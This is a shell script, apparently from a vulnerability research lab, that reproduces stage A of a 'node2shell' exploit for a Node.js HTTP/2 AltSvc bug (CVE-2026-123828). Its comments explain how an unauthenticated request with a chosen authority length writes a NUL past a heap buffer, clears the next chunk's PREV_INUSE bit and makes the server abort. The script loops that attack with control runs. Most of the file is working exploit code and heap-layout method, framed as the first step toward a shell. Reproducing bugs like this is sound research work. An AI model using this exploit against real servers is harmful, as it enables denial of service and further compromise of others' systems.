#!/bin/sh
# node2shell Stage A — deterministic one-byte heap corruption and at-will
# glibc abort on the officially affected prebuilt (CVE-2026-123828).
#
# One unauthenticated loopback request with :authority_len = 1040 makes
# Http2Session::AltSvc write a NUL one byte past a 1048-byte origin
# buffer (origin_len ≡ 8 mod 16 ⇒ the byte lands on the FOLLOWING
# chunk's size-field LSB, clearing PREV_INUSE). On the v24.22.2
# prebuilt the abort is deterministic: the very next malloc — nghttp2's
# ALTSVC origin copy inside the same session.altsvc() call — fails
# glibc's unsorted-bin validation and the server dies SIGABRT (rc 134).
#
# Controls proving the byte matters:
#   - off-class length (origin_len 1056 ≡ 0 mod 16: NUL lands in the
#     next chunk's unused prev_size) — no abort, request completes;
#   - fixed prebuilt v24.22.3, same on-class request — no abort.
#
# Usage:  sh lab/repro/node2shell-stageA.sh [runs]
#   VULN_BIN / FIXED_BIN env override the node binaries (provisioned
#   prebuilts under lab/node2shell/bin/; the fixed binary may be absent
#   on a clean checkout — the control is skipped with a note).
#   BIN paths are relative to the repo root; run from repo root.

set -u

VULN_BIN=${VULN_BIN:-lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node}
FIXED_BIN=${FIXED_BIN:-lab/node2shell/bin/node-v24.22.3-linux-x64/bin/node}
RUNS=${1:-5}
SRV=lab/repro/node2shell-rung1-server.js
CLI=lab/repro/node2shell-rung1-client.js
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

one_run() {  # $1=node binary, $2=authority_len  → rc on stdout, abort msg in $TMP/err
  bin="$1"; auth="$2"
  "$bin" "$SRV" 0 >"$TMP/out" 2>"$TMP/err" &
  pid=$!
  i=0
  while [ $i -lt 40 ]; do
    port=$(awk '/^LISTEN/{print $2}' "$TMP/out" 2>/dev/null)
    [ -n "$port" ] && break
    i=$((i + 1)); sleep 0.1
  done
  "$bin" "$CLI" "$port" "$auth" >/dev/null 2>&1
  sleep 0.2
  if kill -0 "$pid" 2>/dev/null; then
    kill -9 "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; echo 137
  else
    wait "$pid" 2>/dev/null; echo $?
  fi
}

echo "== vulnerable v24.22.2, authority_len 1040 (origin_len 1048 ≡ 8 mod 16)"
abort=0
i=1
while [ $i -le "$RUNS" ]; do
  rc=$(one_run "$VULN_BIN" 1040)
  msg=$(head -1 "$TMP/err")
  printf 'run %d: server_rc=%s msg="%s"\n' "$i" "$rc" "$msg"
  [ "$rc" = 134 ] && abort=$((abort + 1))
  i=$((i + 1))
done
printf 'aborts: %d/%d (expected %d/%d)\n' "$abort" "$RUNS" "$RUNS" "$RUNS"

echo "== off-class control, authority_len 1048 (origin_len 1056 ≡ 0 mod 16)"
rc=$(one_run "$VULN_BIN" 1048)
printf 'server_rc=%s (137 = killed alive: no abort) msg="%s"\n' "$rc" "$(head -1 "$TMP/err")"

if [ -x "$FIXED_BIN" ]; then
  echo "== fixed control v24.22.3, authority_len 1040 (same on-class request)"
  rc=$(one_run "$FIXED_BIN" 1040)
  printf 'server_rc=%s (137 = killed alive: no abort) msg="%s"\n' "$rc" "$(head -1 "$TMP/err")"
else
  echo "== fixed control skipped: $FIXED_BIN absent (provision it from nodejs.org)"
fi

[ "$abort" -eq "$RUNS" ] && echo "STAGE-A RESULT: deterministic abort reproduced" \
  || echo "STAGE-A RESULT: UNEXPECTED — $abort/$RUNS aborts, layout drift?"
